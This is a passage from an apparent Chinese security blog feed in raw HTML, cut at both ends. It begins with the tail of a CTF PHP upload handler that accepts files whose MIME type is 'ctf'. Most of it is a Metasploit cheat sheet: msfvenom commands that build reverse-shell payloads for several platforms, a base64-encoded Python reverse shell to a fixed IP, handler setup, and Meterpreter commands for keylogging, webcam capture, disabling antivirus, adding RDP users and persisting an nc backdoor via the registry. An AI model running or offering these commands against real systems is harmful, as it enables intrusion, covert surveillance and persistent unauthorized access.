class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename_</span> = end(<span class="variable">$filename_hz</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filename_</span>, <span class="variable">$name</span>) || <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$tmpname</span>   = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$name</span>      = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_name</span> = md5(date(<span class="string">&#x27;YmdHis&#x27;</span>).rand(<span class="number">100</span>,<span class="number">999</span>).<span class="variable">$name</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$filename_</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into upload_file values(&#x27;<span class="subst">$file_name</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>, <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file_name</span>))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&quot;</span>.<span class="string">&quot;/upload/<span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;............ctf&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éœ€è¦ï¼‰æ¥é—­åˆã€‚<br><a href="https://cloud.tencent.com/developer/article/1630134">æŠ¥é”™æ³¨å…¥</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MSFå¤‡å¿˜å½•</title>
      <link href="/2022/04/05/MSF%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2022/04/05/MSF%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–"><a href="#1-å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–" class="headerlink" title="1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–"></a>1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–</h2><p>å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤"><a href="#2-msfåŸºæœ¬å‘½ä»¤" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload"><a href="#3-msfvenomç”Ÿæˆpayload" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure><p>1.å¯æ‰§è¡Œç¨‹åº</p><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚</p><p>2.Web Payloads</p><p>PHP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>JSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><p>WAR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure><p>3.è„šæœ¬shell</p><p>Python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><p>Bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><p>Perl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>4.shellcode<br>Linux Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>Windows Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>Mac Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2><p>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure><p>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚</p><p>è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚</p><h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e 